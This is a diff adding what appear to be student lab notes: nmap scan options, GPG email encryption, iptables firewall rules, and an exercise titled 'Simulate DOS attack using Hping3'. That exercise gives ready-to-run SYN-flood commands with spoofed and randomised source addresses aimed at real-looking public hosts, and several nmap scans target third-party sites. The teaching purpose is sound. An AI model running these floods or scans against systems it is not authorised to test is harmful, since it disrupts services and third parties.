@@ -104,14 +104,133 @@ AIM: Installation of NMAP and using it with different options to scan open
 ports, perform OS fingerprinting, ping scan, TCP port scan, UDP post scan, etc.
 
 sudo nmap su
-nmap sU tsec.edu
-nmap sT tsec.edu
+nmap -sU tsec.edu
+nmap -sT tsec.edu
 sudo usermod -aG wireshark $(whoami)
 ifconfig
 ipconfig
-nmap sS tsec.edu
-nmap sS google.com
-sudo nmap sU google.com
-sudo nmap sU tsec.edu
-sudo nmap sS google.com
-sudo nmap sT google.com
+nmap -sS tsec.edu
+nmap -sS google.com
+sudo nmap -sU google.com
+sudo nmap -sU tsec.edu
+sudo nmap -sS google.com
+sudo nmap -sT google.com
+sudo nmap -sN google.com
+sudo nmap -sV youtube.com
+sudo nmap -s0 google.com
+sudo nmap -o google.com
+sudo nmap -sF google.com
+sudo nmap -sX google.com
+sudo nmap -sA google.com
+sudo nmap -sP 192.168.0.*
+
+
+------------------------------------------------------
+
+AIM: Simulate DOS attack using Hping3.
+
+sudo apt install hping3 -y
+sudo yum -y install hping3
+
+A simple DOS (not DDOS) attack would be:
+sudo hping3 -S --flood -V -p 80 170.155.9.185
+
+SYN packets include the connection synchronization confirmation request.
+sudo hping3 lacampora.org -q -n -d 120 -S -p 80 --flood --rand-source
+
+The following example shows another possible SYN flood test for port 80.
+sudo hping3 --rand-source ivan.com -S -q -p 80 --flood
+
+Flood From a Fake IP Address With hping3
+sudo hping3 -a <FAKE IP> <target> -S -q -p 80
+In the example below, I replaced my real IP address with the IP 190.0.174.10.
+sudo hping3 -a 190.0.174.10 190.0.175.100 -S -q -p 80
+
+
+-------------------------------------------------------------
+
+AIM: Explore the GPG tool of linux to implement email security.
+
+Step 1: Generate private key and public key pairs for sender and receiverusing command
+gpg --gen-key or gpg –full-generate-key (repeat for sender and receiver)
+
+Step 2: Create a file containing sender’s public key which then can be sent to other users.
+gpg --export -a username>filename (creates file in ascii format) or
+gpg --output filename --armor --export user’s_email (for sender)
+
+Step 3: Similarly create file containing sender’s private key.
+gpg --export-secret-key -a username>filename (for sender)
+
+Step 4: You can create a fingerprint of key using the command
+gpg --fingerprint receiver’s_email (for receiver)
+
+Step 5: Sender needs to add in his public key ring, the public key of receiver 
+gpg --import filename_containing_public_key_of_receiver (for sender)
+
+Step 6: Listing public keys in keyring
+gpg --list-keys (from public key rings of all users)
+gpg --list-keys shachi_natu@yahoo.com (from public key rings of specific users)
+
+Step 7: Snder can sign the public key of receiver using command
+gpg --sign-key receiver_email
+
+Step 8: Encrypt the data to send. (create a file beforehand to be encrypted)
+gpg --encrypt -r receiver_email name_of_file (only encrypt, .gpg file created) OR
+gpg --encrypt --sign --armor -r receiver_email name_of_file (encrypt and sign, ascii file created) or
+gpg --encrypt --sign -r receiver_email name_of_file (encrypt and sign, .gpg file created)
+
+Step 9: Decrypt the file
+gpg -o myfiledecrypted -d myfile.txt.gpg
+
+
+-------------------------------------------------------------
+
+AIM: To study and configure Firewalls using IP tables
+
+A firewall is a system designed to prevent unauthorized access to or from a private network. 
+You can implement a firewall in either hardware or software form, or a combination of both. 
+Generally the firewall has two network interfaces: one for the external side of the network, 
+one for the internal side. Its purpose is to control what traffic is allowed to traverse from one 
+side to the other. As the most basic level, firewalls can block traffic intended for particular 
+IP addresses or server ports.
+
+Types of Firewalls
+Three basic types of network firewalls: packet filtering (stateless), stateful, and application 
+layer.
+Packet filtering, or stateless, firewalls work by inspecting individual packets in isolation. 
+As such, they are unaware of connection state and can only allow or deny packets based on 
+individual packet headers.
+Stateful firewalls are able to determine the connection state of packets, which makes them 
+much more flexible than stateless firewalls. They work by collecting related packets until 
+the connection state can be determined before any firewall rules are applied to the traffic.
+Application firewalls go one step further by analyzing the data being transmitted, which 
+allows network traffic to be matched against firewall rules that are specific to individual 
+services or applications. These are also known as proxy-based firewalls.
+
+sudo iptables -L
+(-L - List the current filter rules. )
+
+sudo iptables -A INPUT -p tcp --dport ssh -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT  
+sudo iptables -A INPUT -j DROP
+sudo iptables -L
+sudo iptables -I INPUT 1 -i lo -j ACCEPT
+sudo iptables -L
+sudo iptables -L -v
+
+Allow traffic on ICMP port
+sudo iptables -A INPUT -p icmp -j ACCEPT
+now list the rules again..
+sudo iptables -L
+
+Dropping icmp packets
+try to ping ur neighbour machine
+ping 192.168.92.17
+u can see the response packets received.
+Now block incoming icmp packets from the neighbour using command:
+sudo iptables -A INPUT -p icmp -j DROP
+list the rule:
+sudo iptables -L
+try to ping ur neighbour machine again
+ping 192.168.92.17
+u can not see receive icmp echo reply packets.
